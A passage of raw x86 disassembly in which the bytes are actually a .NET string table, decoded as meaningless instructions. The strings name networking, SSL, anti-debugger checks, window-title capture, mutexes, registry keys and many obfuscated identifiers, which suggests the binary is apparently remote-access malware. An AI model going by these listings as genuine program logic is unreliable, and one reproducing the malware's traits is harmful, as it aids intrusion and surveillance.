  4099bd:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  4099c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4099c2:	6c                   	insb   (%dx),%es:(%edi)
  4099c3:	6c                   	insb   (%dx),%es:(%edi)
  4099c4:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  4099c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4099ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4099cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4099cc:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  4099d1:	65 74 00             	gs je  0x4099d4
  4099d4:	53                   	push   %ebx
  4099d5:	79 73                	jns    0x409a4a
  4099d7:	74 65                	je     0x409a3e
  4099d9:	6d                   	insl   (%dx),%es:(%edi)
  4099da:	2e 4e                	cs dec %esi
  4099dc:	65 74 00             	gs je  0x4099df
  4099df:	62 5a 6a             	bound  %ebx,0x6a(%edx)
  4099e2:	5a                   	pop    %edx
  4099e3:	67 49                	addr16 dec %ecx
  4099e5:	75 73                	jne    0x409a5a
  4099e7:	6b 74 74 45 61       	imul   $0x61,0x45(%esp,%esi,2),%esi
  4099ec:	65 74 00             	gs je  0x4099ef
  4099ef:	54                   	push   %esp
  4099f0:	61                   	popa
  4099f1:	72 67                	jb     0x409a5a
  4099f3:	65 74 00             	gs je  0x4099f6
  4099f6:	53                   	push   %ebx
  4099f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4099f8:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4099fb:	74 00                	je     0x4099fd
  4099fd:	53                   	push   %ebx
  4099fe:	79 73                	jns    0x409a73
  409a00:	74 65                	je     0x409a67
  409a02:	6d                   	insl   (%dx),%es:(%edi)
  409a03:	2e 43                	cs inc %ebx
  409a05:	6f                   	outsl  %ds:(%esi),(%dx)
  409a06:	6c                   	insb   (%dx),%es:(%edi)
  409a07:	6c                   	insb   (%dx),%es:(%edi)
  409a08:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a0d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a0e:	73 2e                	jae    0x409a3e
  409a10:	49                   	dec    %ecx
  409a11:	45                   	inc    %ebp
  409a12:	6e                   	outsb  %ds:(%esi),(%dx)
  409a13:	75 6d                	jne    0x409a82
  409a15:	65 72 61             	gs jb  0x409a79
  409a18:	74 6f                	je     0x409a89
  409a1a:	72 2e                	jb     0x409a4a
  409a1c:	52                   	push   %edx
  409a1d:	65 73 65             	gs jae 0x409a85
  409a20:	74 00                	je     0x409a22
  409a22:	67 65 74 5f          	addr16 gs je 0x409a85
  409a26:	4f                   	dec    %edi
  409a27:	66 66 73 65          	data16 data16 jae 0x409a90
  409a2b:	74 00                	je     0x409a2d
  409a2d:	73 65                	jae    0x409a94
  409a2f:	74 5f                	je     0x409a90
  409a31:	4f                   	dec    %edi
  409a32:	66 66 73 65          	data16 data16 jae 0x409a9b
  409a36:	74 00                	je     0x409a38
  409a38:	53                   	push   %ebx
  409a39:	70 6c                	jo     0x409aa7
  409a3b:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  409a42:	00 
  409a43:	49                   	dec    %ecx
  409a44:	41                   	inc    %ecx
  409a45:	73 79                	jae    0x409ac0
  409a47:	6e                   	outsb  %ds:(%esi),(%dx)
  409a48:	63 52 65             	arpl   %edx,0x65(%edx)
  409a4b:	73 75                	jae    0x409ac2
  409a4d:	6c                   	insb   (%dx),%es:(%edi)
  409a4e:	74 00                	je     0x409a50
  409a50:	54                   	push   %esp
  409a51:	6f                   	outsl  %ds:(%esi),(%dx)
  409a52:	55                   	push   %ebp
  409a53:	70 70                	jo     0x409ac5
  409a55:	65 72 49             	gs jb  0x409aa1
  409a58:	6e                   	outsb  %ds:(%esi),(%dx)
  409a59:	76 61                	jbe    0x409abc
  409a5b:	72 69                	jb     0x409ac6
  409a5d:	61                   	popa
  409a5e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a5f:	74 00                	je     0x409a61
  409a61:	57                   	push   %edi
  409a62:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a66:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a6d:	74 5f                	je     0x409ace
  409a6f:	53                   	push   %ebx
  409a70:	73 6c                	jae    0x409ade
  409a72:	43                   	inc    %ebx
  409a73:	6c                   	insb   (%dx),%es:(%edi)
  409a74:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a7b:	74 5f                	je     0x409adc
  409a7d:	53                   	push   %ebx
  409a7e:	73 6c                	jae    0x409aec
  409a80:	43                   	inc    %ebx
  409a81:	6c                   	insb   (%dx),%es:(%edi)
  409a82:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a89:	74 5f                	je     0x409aea
  409a8b:	54                   	push   %esp
  409a8c:	63 70 43             	arpl   %esi,0x43(%eax)
  409a8f:	6c                   	insb   (%dx),%es:(%edi)
  409a90:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a97:	74 5f                	je     0x409af8
  409a99:	54                   	push   %esp
  409a9a:	63 70 43             	arpl   %esi,0x43(%eax)
  409a9d:	6c                   	insb   (%dx),%es:(%edi)
  409a9e:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409aa5:	74 68                	je     0x409b0f
  409aa7:	65 6e                	outsb  %gs:(%esi),(%dx)
  409aa9:	74 69                	je     0x409b14
  409aab:	63 61 74             	arpl   %esp,0x74(%ecx)
  409aae:	65 41                	gs inc %ecx
  409ab0:	73 43                	jae    0x409af5
  409ab2:	6c                   	insb   (%dx),%es:(%edi)
  409ab3:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409aba:	73 74                	jae    0x409b30
  409abc:	65 6d                	gs insl (%dx),%es:(%edi)
  409abe:	2e 4d                	cs dec %ebp
  409ac0:	61                   	popa
  409ac1:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac2:	61                   	popa
  409ac3:	67 65 6d             	gs insl (%dx),%es:(%di)
  409ac6:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ac8:	74 00                	je     0x409aca
  409aca:	45                   	inc    %ebp
  409acb:	6e                   	outsb  %ds:(%esi),(%dx)
  409acc:	76 69                	jbe    0x409b37
  409ace:	72 6f                	jb     0x409b3f
  409ad0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad1:	6d                   	insl   (%dx),%es:(%edi)
  409ad2:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ad4:	74 00                	je     0x409ad6
  409ad6:	53                   	push   %ebx
  409ad7:	79 73                	jns    0x409b4c
  409ad9:	74 65                	je     0x409b40
  409adb:	6d                   	insl   (%dx),%es:(%edi)
  409adc:	2e 43                	cs inc %ebx
  409ade:	6f                   	outsl  %ds:(%esi),(%dx)
  409adf:	6c                   	insb   (%dx),%es:(%edi)
  409ae0:	6c                   	insb   (%dx),%es:(%edi)
  409ae1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409ae6:	6e                   	outsb  %ds:(%esi),(%dx)
  409ae7:	73 2e                	jae    0x409b17
  409ae9:	49                   	dec    %ecx
  409aea:	45                   	inc    %ebp
  409aeb:	6e                   	outsb  %ds:(%esi),(%dx)
  409aec:	75 6d                	jne    0x409b5b
  409aee:	65 72 61             	gs jb  0x409b52
  409af1:	74 6f                	je     0x409b62
  409af3:	72 2e                	jb     0x409b23
  409af5:	67 65 74 5f          	addr16 gs je 0x409b58
  409af9:	43                   	inc    %ebx
  409afa:	75 72                	jne    0x409b6e
  409afc:	72 65                	jb     0x409b63
  409afe:	6e                   	outsb  %ds:(%esi),(%dx)
  409aff:	74 00                	je     0x409b01
  409b01:	47                   	inc    %edi
  409b02:	65 74 43             	gs je  0x409b48
  409b05:	75 72                	jne    0x409b79
  409b07:	72 65                	jb     0x409b6e
  409b09:	6e                   	outsb  %ds:(%esi),(%dx)
  409b0a:	74 00                	je     0x409b0c
  409b0c:	43                   	inc    %ebx
  409b0d:	68 65 63 6b 52       	push   $0x526b6365
  409b12:	65 6d                	gs insl (%dx),%es:(%edi)
  409b14:	6f                   	outsl  %ds:(%esi),(%dx)
  409b15:	74 65                	je     0x409b7c
  409b17:	44                   	inc    %esp
  409b18:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409b1c:	67 65 72 50          	addr16 gs jb 0x409b70
  409b20:	72 65                	jb     0x409b87
  409b22:	73 65                	jae    0x409b89
  409b24:	6e                   	outsb  %ds:(%esi),(%dx)
  409b25:	74 00                	je     0x409b27
  409b27:	50                   	push   %eax
  409b28:	62 48 4e             	bound  %ecx,0x4e(%eax)
  409b2b:	75 65                	jne    0x409b92
  409b2d:	57                   	push   %edi
  409b2e:	69 65 67 6e 74 00 67 	imul   $0x6700746e,0x67(%ebp),%esp
  409b35:	65 74 5f             	gs je  0x409b97
  409b38:	52                   	push   %edx
  409b39:	65 6d                	gs insl (%dx),%es:(%edi)
  409b3b:	6f                   	outsl  %ds:(%esi),(%dx)
  409b3c:	74 65                	je     0x409ba3
  409b3e:	45                   	inc    %ebp
  409b3f:	6e                   	outsb  %ds:(%esi),(%dx)
  409b40:	64 50                	fs push %eax
  409b42:	6f                   	outsl  %ds:(%esi),(%dx)
  409b43:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409b4a:	5f                   	pop    %edi
  409b4b:	43                   	inc    %ebx
  409b4c:	6f                   	outsl  %ds:(%esi),(%dx)
  409b4d:	75 6e                	jne    0x409bbd
  409b4f:	74 00                	je     0x409b51
  409b51:	67 65 74 5f          	addr16 gs je 0x409bb4
  409b55:	50                   	push   %eax
  409b56:	72 6f                	jb     0x409bc7
  409b58:	63 65 73             	arpl   %esp,0x73(%ebp)
  409b5b:	73 6f                	jae    0x409bcc
  409b5d:	72 43                	jb     0x409ba2
  409b5f:	6f                   	outsl  %ds:(%esi),(%dx)
  409b60:	75 6e                	jne    0x409bd0
  409b62:	74 00                	je     0x409b64
  409b64:	47                   	inc    %edi
  409b65:	65 74 50             	gs je  0x409bb8
  409b68:	61                   	popa
  409b69:	74 68                	je     0x409bd3
  409b6b:	52                   	push   %edx
  409b6c:	6f                   	outsl  %ds:(%esi),(%dx)
  409b6d:	6f                   	outsl  %ds:(%esi),(%dx)
  409b6e:	74 00                	je     0x409b70
  409b70:	41                   	inc    %ecx
  409b71:	6d                   	insl   (%dx),%es:(%edi)
  409b72:	46                   	inc    %esi
  409b73:	43                   	inc    %ebx
  409b74:	71 6e                	jno    0x409be4
  409b76:	4b                   	dec    %ebx
  409b77:	4d                   	dec    %ebp
  409b78:	63 76 49             	arpl   %esi,0x49(%esi)
  409b7b:	74 70                	je     0x409bed
  409b7d:	74 00                	je     0x409b7f
  409b7f:	50                   	push   %eax
  409b80:	61                   	popa
  409b81:	72 61                	jb     0x409be4
  409b83:	6d                   	insl   (%dx),%es:(%edi)
  409b84:	65 74 65             	gs je  0x409bec
  409b87:	72 69                	jb     0x409bf2
  409b89:	7a 65                	jp     0x409bf0
  409b8b:	64 54                	fs push %esp
  409b8d:	68 72 65 61 64       	push   $0x64616572
  409b92:	53                   	push   %ebx
  409b93:	74 61                	je     0x409bf6
  409b95:	72 74                	jb     0x409c0b
  409b97:	00 43 6f             	add    %al,0x6f(%ebx)
  409b9a:	6e                   	outsb  %ds:(%esi),(%dx)
  409b9b:	76 65                	jbe    0x409c02
  409b9d:	72 74                	jb     0x409c13
  409b9f:	00 73 7a             	add    %dh,0x7a(%ebx)
  409ba2:	69 56 75 55 79 4d 6f 	imul   $0x6f4d7955,0x75(%esi),%edx
  409ba9:	4c                   	dec    %esp
  409baa:	75 43                	jne    0x409bef
  409bac:	55                   	push   %ebp
  409bad:	69 72 74 00 46 61 69 	imul   $0x69614600,0x74(%edx),%esi
  409bb4:	6c                   	insb   (%dx),%es:(%edi)
  409bb5:	46                   	inc    %esi
  409bb6:	61                   	popa
  409bb7:	73 74                	jae    0x409c2d
  409bb9:	00 54 6f 4c          	add    %dl,0x4c(%edi,%ebp,2)
  409bbd:	69 73 74 00 6b 6a 79 	imul   $0x796a6b00,0x74(%ebx),%esi
  409bc4:	4d                   	dec    %ebp
  409bc5:	6a 45                	push   $0x45
  409bc7:	45                   	inc    %ebp
  409bc8:	47                   	inc    %edi
  409bc9:	6f                   	outsl  %ds:(%esi),(%dx)
  409bca:	79 74                	jns    0x409c40
  409bcc:	74 00                	je     0x409bce
  409bce:	77 66                	ja     0x409c36
  409bd0:	6b 6d 68 5a          	imul   $0x5a,0x68(%ebp),%ebp
  409bd4:	47                   	inc    %edi
  409bd5:	42                   	inc    %edx
  409bd6:	44                   	inc    %esp
  409bd7:	4f                   	dec    %edi
  409bd8:	7a 77                	jp     0x409c51
  409bda:	74 00                	je     0x409bdc
  409bdc:	53                   	push   %ebx
  409bdd:	79 73                	jns    0x409c52
  409bdf:	74 65                	je     0x409c46
  409be1:	6d                   	insl   (%dx),%es:(%edi)
  409be2:	2e 43                	cs inc %ebx
  409be4:	6f                   	outsl  %ds:(%esi),(%dx)
  409be5:	6c                   	insb   (%dx),%es:(%edi)
  409be6:	6c                   	insb   (%dx),%es:(%edi)
  409be7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409bec:	6e                   	outsb  %ds:(%esi),(%dx)
  409bed:	73 2e                	jae    0x409c1d
  409bef:	49                   	dec    %ecx
  409bf0:	45                   	inc    %ebp
  409bf1:	6e                   	outsb  %ds:(%esi),(%dx)
  409bf2:	75 6d                	jne    0x409c61
  409bf4:	65 72 61             	gs jb  0x409c58
  409bf7:	74 6f                	je     0x409c68
  409bf9:	72 2e                	jb     0x409c29
  409bfb:	4d                   	dec    %ebp
  409bfc:	6f                   	outsl  %ds:(%esi),(%dx)
  409bfd:	76 65                	jbe    0x409c64
  409bff:	4e                   	dec    %esi
  409c00:	65 78 74             	gs js  0x409c77
  409c03:	00 53 79             	add    %dl,0x79(%ebx)
  409c06:	73 74                	jae    0x409c7c
  409c08:	65 6d                	gs insl (%dx),%es:(%edi)
  409c0a:	2e 54                	cs push %esp
  409c0c:	65 78 74             	gs js  0x409c83
  409c0f:	00 47 65             	add    %al,0x65(%edi)
  409c12:	74 57                	je     0x409c6b
  409c14:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409c1b:	78 74                	js     0x409c91
  409c1d:	00 55 78             	add    %dl,0x78(%ebp)
  409c20:	4b                   	dec    %ebx
  409c21:	42                   	inc    %edx
  409c22:	61                   	popa
  409c23:	68 69 68 7a 4b       	push   $0x4b7a6869
  409c28:	75 00                	jne    0x409c2a
  409c2a:	74 79                	je     0x409ca5
  409c2c:	7a 47                	jp     0x409c75
  409c2e:	4a                   	dec    %edx
  409c2f:	4a                   	dec    %edx
  409c30:	52                   	push   %edx
  409c31:	6d                   	insl   (%dx),%es:(%edi)
  409c32:	51                   	push   %ecx
  409c33:	41                   	inc    %ecx
  409c34:	76 6a                	jbe    0x409ca0
  409c36:	46                   	inc    %esi
  409c37:	5a                   	pop    %edx
  409c38:	75 00                	jne    0x409c3a
  409c3a:	4f                   	dec    %edi
  409c3b:	53                   	push   %ebx
  409c3c:	4a                   	dec    %edx
  409c3d:	5a                   	pop    %edx
  409c3e:	53                   	push   %ebx
  409c3f:	42                   	inc    %edx
  409c40:	44                   	inc    %esp
  409c41:	43                   	inc    %ebx
  409c42:	6e                   	outsb  %ds:(%esi),(%dx)
  409c43:	62 6a 67             	bound  %ebp,0x67(%edx)
  409c46:	75 00                	jne    0x409c48
  409c48:	48                   	dec    %eax
  409c49:	6b 48 57 62          	imul   $0x62,0x57(%eax),%ecx
  409c4d:	47                   	inc    %edi
  409c4e:	64 5a                	fs pop %edx
  409c50:	51                   	push   %ecx
  409c51:	4d                   	dec    %ebp
  409c52:	68 75 00 4e 54       	push   $0x544e0075
  409c57:	6d                   	insl   (%dx),%es:(%edi)
  409c58:	57                   	push   %edi
  409c59:	53                   	push   %ebx
  409c5a:	6b 41 67 7a          	imul   $0x7a,0x67(%ecx),%eax
  409c5e:	44                   	inc    %esp
  409c5f:	45                   	inc    %ebp
  409c60:	71 6c                	jno    0x409cce
  409c62:	75 00                	jne    0x409c64
  409c64:	50                   	push   %eax
  409c65:	72 42                	jb     0x409ca9
  409c67:	54                   	push   %esp
  409c68:	6b 5a 46 73          	imul   $0x73,0x46(%edx),%ebx
  409c6c:	6f                   	outsl  %ds:(%esi),(%dx)
  409c6d:	75 00                	jne    0x409c6f
  409c6f:	4a                   	dec    %edx
  409c70:	7a 76                	jp     0x409ce8
  409c72:	63 4d 46             	arpl   %ecx,0x46(%ebp)
  409c75:	6b 66 70 4c          	imul   $0x4c,0x70(%esi),%esp
  409c79:	4d                   	dec    %ebp
  409c7a:	76 00                	jbe    0x409c7c
  409c7c:	6c                   	insb   (%dx),%es:(%edi)
  409c7d:	4f                   	dec    %edi
  409c7e:	4a                   	dec    %edx
  409c7f:	4d                   	dec    %ebp
  409c80:	52                   	push   %edx
  409c81:	50                   	push   %eax
  409c82:	6d                   	insl   (%dx),%es:(%edi)
  409c83:	4d                   	dec    %ebp
  409c84:	78 54                	js     0x409cda
  409c86:	57                   	push   %edi
  409c87:	76 00                	jbe    0x409c89
  409c89:	62 56 69             	bound  %edx,0x69(%esi)
  409c8c:	4d                   	dec    %ebp
  409c8d:	69 77 43 4d 6a 78 63 	imul   $0x63786a4d,0x43(%edi),%esi
  409c94:	64 76 00             	fs jbe 0x409c97
  409c97:	51                   	push   %ecx
  409c98:	6c                   	insb   (%dx),%es:(%edi)
  409c99:	58                   	pop    %eax
  409c9a:	72 63                	jb     0x409cff
  409c9c:	65 4f                	gs dec %edi
  409c9e:	4d                   	dec    %ebp
  409c9f:	48                   	dec    %eax
  409ca0:	70 6a                	jo     0x409d0c
  409ca2:	76 00                	jbe    0x409ca4
  409ca4:	79 6b                	jns    0x409d11
  409ca6:	6a 52                	push   $0x52
  409ca8:	76 64                	jbe    0x409d0e
  409caa:	73 4c                	jae    0x409cf8
  409cac:	4f                   	dec    %edi
  409cad:	72 67                	jb     0x409d16
  409caf:	6b 70 73 76          	imul   $0x76,0x73(%eax),%esi
  409cb3:	00 65 75             	add    %ah,0x75(%ebp)
  409cb6:	4a                   	dec    %edx
  409cb7:	61                   	popa
  409cb8:	4d                   	dec    %ebp
  409cb9:	55                   	push   %ebp
  409cba:	42                   	inc    %edx
  409cbb:	66 54                	push   %sp
  409cbd:	70 7a                	jo     0x409d39
  409cbf:	76 00                	jbe    0x409cc1
  409cc1:	68 65 57 76 58       	push   $0x58765765
  409cc6:	69 58 75 6d 69 4e 41 	imul   $0x414e696d,0x75(%eax),%ebx
  409ccd:	5a                   	pop    %edx
  409cce:	72 66                	jb     0x409d36
  409cd0:	53                   	push   %ebx
  409cd1:	77 00                	ja     0x409cd3
  409cd3:	4a                   	dec    %edx
  409cd4:	51                   	push   %ecx
  409cd5:	50                   	push   %eax
  409cd6:	44                   	inc    %esp
  409cd7:	70 53                	jo     0x409d2c
  409cd9:	47                   	inc    %edi
  409cda:	46                   	inc    %esi
  409cdb:	79 69                	jns    0x409d46
  409cdd:	41                   	inc    %ecx
  409cde:	6c                   	insb   (%dx),%es:(%edi)
  409cdf:	77 00                	ja     0x409ce1
  409ce1:	47                   	inc    %edi
  409ce2:	65 74 46             	gs je  0x409d2b
  409ce5:	6f                   	outsl  %ds:(%esi),(%dx)
  409ce6:	72 65                	jb     0x409d4d
  409ce8:	67 72 6f             	addr16 jb 0x409d5a
  409ceb:	75 6e                	jne    0x409d5b
  409ced:	64 57                	fs push %edi
  409cef:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409cf6:	65 74 5f             	gs je  0x409d58
  409cf9:	43                   	inc    %ebx
  409cfa:	72 65                	jb     0x409d61
  409cfc:	61                   	popa
  409cfd:	74 65                	je     0x409d64
  409cff:	4e                   	dec    %esi
  409d00:	6f                   	outsl  %ds:(%esi),(%dx)
  409d01:	57                   	push   %edi
  409d02:	69 6e 64 6f 77 00 74 	imul   $0x7400776f,0x64(%esi),%ebp
  409d09:	65 53                	gs push %ebx
  409d0b:	70 68                	jo     0x409d75
  409d0d:	78 6e                	js     0x409d7d
  409d0f:	6a 78                	push   $0x78
  409d11:	77 00                	ja     0x409d13
  409d13:	4a                   	dec    %edx
  409d14:	68 4a 50 73 4a       	push   $0x4a73504a
  409d19:	79 74                	jns    0x409d8f
  409d1b:	49                   	dec    %ecx
  409d1c:	6c                   	insb   (%dx),%es:(%edi)
  409d1d:	43                   	inc    %ebx
  409d1e:	4c                   	dec    %esp
  409d1f:	41                   	inc    %ecx
  409d20:	78 00                	js     0x409d22
  409d22:	50                   	push   %eax
  409d23:	74 73                	je     0x409d98
  409d25:	56                   	push   %esi
  409d26:	52                   	push   %edx
  409d27:	6e                   	outsb  %ds:(%esi),(%dx)
  409d28:	44                   	inc    %esp
  409d29:	63 44 61 45          	arpl   %eax,0x45(%ecx,%eiz,2)
  409d2d:	78 00                	js     0x409d2f
  409d2f:	73 41                	jae    0x409d72
  409d31:	62 54 6f 75          	bound  %edx,0x75(%edi,%ebp,2)
  409d35:	6d                   	insl   (%dx),%es:(%edi)
  409d36:	76 46                	jbe    0x409d7e
  409d38:	78 00                	js     0x409d3a
  409d3a:	54                   	push   %esp
  409d3b:	78 75                	js     0x409db2
  409d3d:	42                   	inc    %edx
  409d3e:	51                   	push   %ecx
  409d3f:	69 74 51 47 78 00 42 	imul   $0x55420078,0x47(%ecx,%edx,2),%esi
  409d46:	55 
  409d47:	77 74                	ja     0x409dbd
  409d49:	76 7a                	jbe    0x409dc5
  409d4b:	72 42                	jb     0x409d8f
  409d4d:	7a 69                	jp     0x409db8
  409d4f:	64 58                	fs pop %eax
  409d51:	53                   	push   %ebx
  409d52:	75 6b                	jne    0x409dbf
  409d54:	52                   	push   %edx
  409d55:	78 00                	js     0x409d57
  409d57:	4b                   	dec    %ebx
  409d58:	51                   	push   %ecx
  409d59:	52                   	push   %edx
  409d5a:	55                   	push   %ebp
  409d5b:	55                   	push   %ebp
  409d5c:	49                   	dec    %ecx
  409d5d:	72 6a                	jb     0x409dc9
  409d5f:	69 4a 5a 5a 78 00 4d 	imul   $0x4d00785a,0x5a(%edx),%ecx
  409d66:	75 74                	jne    0x409ddc
  409d68:	65 78 00             	gs js  0x409d6b
  409d6b:	5a                   	pop    %edx
  409d6c:	7a 61                	jp     0x409dcf
  409d6e:	6f                   	outsl  %ds:(%esi),(%dx)
  409d6f:	78 68                	js     0x409dd9
  409d71:	6e                   	outsb  %ds:(%esi),(%dx)
  409d72:	6e                   	outsb  %ds:(%esi),(%dx)
  409d73:	68 78 00 7a 45       	push   $0x457a0078
  409d78:	68 55 7a 75 47       	push   $0x47757a55
  409d7d:	4c                   	dec    %esp
  409d7e:	77 61                	ja     0x409de1
  409d80:	7a 78                	jp     0x409dfa
  409d82:	00 4d 75             	add    %cl,0x75(%ebp)
  409d85:	7a 74                	jp     0x409dfb
  409d87:	6e                   	outsb  %ds:(%esi),(%dx)
  409d88:	55                   	push   %ebp
  409d89:	67 4f                	addr16 dec %edi
  409d8b:	6f                   	outsl  %ds:(%esi),(%dx)
  409d8c:	4d                   	dec    %ebp
  409d8d:	72 42                	jb     0x409dd1
  409d8f:	79 00                	jns    0x409d91
  409d91:	77 54                	ja     0x409de7
  409d93:	4d                   	dec    %ebp
  409d94:	67 53                	addr16 push %ebx
  409d96:	57                   	push   %edi
  409d97:	79 59                	jns    0x409df2
  409d99:	49                   	dec    %ecx
  409d9a:	63 61 79             	arpl   %esp,0x79(%ecx)
  409d9d:	00 49 6e             	add    %cl,0x6e(%ecx)
  409da0:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409da7:	65 
  409da8:	41                   	inc    %ecx
  409da9:	72 72                	jb     0x409e1d
  409dab:	61                   	popa
  409dac:	79 00                	jns    0x409dae
  409dae:	54                   	push   %esp
  409daf:	6f                   	outsl  %ds:(%esi),(%dx)
  409db0:	41                   	inc    %ecx
  409db1:	72 72                	jb     0x409e25
  409db3:	61                   	popa
  409db4:	79 00                	jns    0x409db6
  409db6:	67 65 74 5f          	addr16 gs je 0x409e19
  409dba:	41                   	inc    %ecx
  409dbb:	73 41                	jae    0x409dfe
  409dbd:	72 72                	jb     0x409e31
  409dbf:	61                   	popa
  409dc0:	79 00                	jns    0x409dc2
  409dc2:	67 65 74 5f          	addr16 gs je 0x409e25
  409dc6:	4b                   	dec    %ebx
  409dc7:	65 79 00             	gs jns 0x409dca
  409dca:	73 65                	jae    0x409e31
  409dcc:	74 5f                	je     0x409e2d
  409dce:	4b                   	dec    %ebx
  409dcf:	65 79 00             	gs jns 0x409dd2
  409dd2:	43                   	inc    %ebx
  409dd3:	72 65                	jb     0x409e3a
  409dd5:	61                   	popa
  409dd6:	74 65                	je     0x409e3d
  409dd8:	53                   	push   %ebx
  409dd9:	75 62                	jne    0x409e3d
  409ddb:	4b                   	dec    %ebx
  409ddc:	65 79 00             	gs jns 0x409ddf
  409ddf:	4f                   	dec    %edi
  409de0:	70 65                	jo     0x409e47
  409de2:	6e                   	outsb  %ds:(%esi),(%dx)
  409de3:	53                   	push   %ebx
  409de4:	75 62                	jne    0x409e48
  409de6:	4b                   	dec    %ebx
  409de7:	65 79 00             	gs jns 0x409dea
  409dea:	67 65 74 5f          	addr16 gs je 0x409e4d
  409dee:	50                   	push   %eax
  409def:	75 62                	jne    0x409e53
  409df1:	6c                   	insb   (%dx),%es:(%edi)
  409df2:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409df9:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409e00:	4b 65 
  409e02:	79 00                	jns    0x409e04
  409e04:	5a                   	pop    %edx
  409e05:	4f                   	dec    %edi
  409e06:	65 57                	gs push %edi
  409e08:	4a                   	dec    %edx
  409e09:	73 48                	jae    0x409e53
  409e0b:	64 68 79 00 53 79    	fs push $0x79530079
  409e11:	73 74                	jae    0x409e87
  409e13:	65 6d                	gs insl (%dx),%es:(%edi)
  409e15:	2e 53                	cs push %ebx
  409e17:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e1b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409e22:	70 
  409e23:	74 6f                	je     0x409e94
  409e25:	67 72 61             	addr16 jb 0x409e89
  409e28:	70 68                	jo     0x409e92
  409e2a:	79 00                	jns    0x409e2c
  409e2c:	41                   	inc    %ecx
  409e2d:	73 73                	jae    0x409ea2
  409e2f:	65 6d                	gs insl (%dx),%es:(%edi)
  409e31:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409e35:	41                   	inc    %ecx
  409e36:	64 64 72 65          	fs fs jb 0x409e9f
  409e3a:	73 73                	jae    0x409eaf
  409e3c:	46                   	inc    %esi
  409e3d:	61                   	popa
  409e3e:	6d                   	insl   (%dx),%es:(%edi)
  409e3f:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409e46:	63 
  409e47:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409e4b:	79 00                	jns    0x409e4d
  409e4d:	54                   	push   %esp
  409e4e:	6f                   	outsl  %ds:(%esi),(%dx)
  409e4f:	42                   	inc    %edx
  409e50:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e57:	65 74 5f             	gs je  0x409eb9
  409e5a:	53                   	push   %ebx
  409e5b:	79 73                	jns    0x409ed0
  409e5d:	74 65                	je     0x409ec4
  409e5f:	6d                   	insl   (%dx),%es:(%edi)
  409e60:	44                   	inc    %esp
  409e61:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e68:	79 00                	jns    0x409e6a
  409e6a:	52                   	push   %edx
  409e6b:	65 67 69 73 74 72 79 	imul   $0x48007972,%gs:0x74(%bp,%di),%esi
  409e72:	00 48 
  409e74:	58                   	pop    %eax
  409e75:	64 6d                	fs insl (%dx),%es:(%edi)
  409e77:	55                   	push   %ebp
  409e78:	66 65 65 63 50 74    	gs arpl %dx,%gs:0x74(%eax)
  409e7e:	79 00                	jns    0x409e80
  409e80:	6f                   	outsl  %ds:(%esi),(%dx)
  409e81:	70 5f                	jo     0x409ee2
  409e83:	45                   	inc    %ebp
  409e84:	71 75                	jno    0x409efb
  409e86:	61                   	popa
  409e87:	6c                   	insb   (%dx),%es:(%edi)
  409e88:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409e8f:	49 
  409e90:	6e                   	outsb  %ds:(%esi),(%dx)
  409e91:	65 71 75             	gs jno 0x409f09
  409e94:	61                   	popa
  409e95:	6c                   	insb   (%dx),%es:(%edi)
  409e96:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409e9d:	74 
  409e9e:	65 6d                	gs insl (%dx),%es:(%edi)
  409ea0:	2e 4e                	cs dec %esi
  409ea2:	65 74 2e             	gs je  0x409ed3
  409ea5:	53                   	push   %ebx
  409ea6:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409eaa:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409eb1:	64 
  409eb2:	6f                   	outsl  %ds:(%esi),(%dx)
